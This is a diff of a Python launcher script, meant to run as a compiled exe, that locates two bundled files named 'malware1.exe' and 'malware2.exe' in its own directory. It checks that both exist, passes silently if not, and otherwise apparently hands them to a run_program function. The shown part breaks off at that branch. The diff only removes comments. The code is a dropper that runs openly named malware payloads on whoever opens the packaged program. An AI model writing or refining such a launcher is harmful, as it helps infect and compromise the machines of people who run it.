@@ -27,21 +27,16 @@ def run_program(program_path):
 
 def get_current_directory():
     if getattr(sys, 'frozen', False):
-        # The application is frozen (compiled to exe)
         return os.path.dirname(sys.executable)
     else:
-        # The script is running in a normal Python environment
         return os.path.dirname(os.path.realpath(__file__))
 
 if __name__ == "__main__":
     # Get the path to the directory where the script or executable is located
     script_path = get_current_directory()
-
-    # Assuming the programs are in the same directory as the script or executable
     program1_path = os.path.join(script_path, 'malware1.exe')
     program2_path = os.path.join(script_path, 'malware2.exe')
 
-    # Check if the programs exist
     if not (os.path.isfile(program1_path) and os.path.isfile(program2_path)):
         pass
     else:
